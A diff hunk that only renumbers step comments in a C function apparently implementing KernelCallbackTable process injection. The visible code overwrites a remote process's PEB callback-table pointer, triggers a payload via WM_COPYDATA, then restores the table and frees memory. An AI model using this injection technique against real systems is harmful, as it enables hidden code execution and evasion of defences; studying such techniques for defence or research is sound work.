@@ -208,19 +208,19 @@ VOID kernelcallbacktable(LPVOID payload, DWORD payloadSize) {
       (PBYTE)pbi.PebBaseAddress + offsetof(PEB, KernelCallbackTable),
       &ds, sizeof(ULONG_PTR), &wr);
     
-    // 5. Trigger execution of payload
+    // 6. Trigger execution of payload
     cds.dwData = 1;
     cds.cbData = lstrlen(msg) * 2;
     cds.lpData = msg;
     
     SendMessage(hw, WM_COPYDATA, (WPARAM)hw, (LPARAM)&cds);
     
-    // 6. Restore original KernelCallbackTable
+    // 7. Restore original KernelCallbackTable
     WriteProcessMemory(hp,
       (PBYTE)pbi.PebBaseAddress + offsetof(PEB, KernelCallbackTable),
       &peb.KernelCallbackTable, sizeof(ULONG_PTR), &wr);
       
-    // 7. Release memory for code and data, close process
+    // 8. Release memory for code and data, close process
     VirtualFreeEx(hp, cs, 0, MEM_DECOMMIT | MEM_RELEASE);
     VirtualFreeEx(hp, ds, 0, MEM_DECOMMIT | MEM_RELEASE);
     CloseHandle(hp);
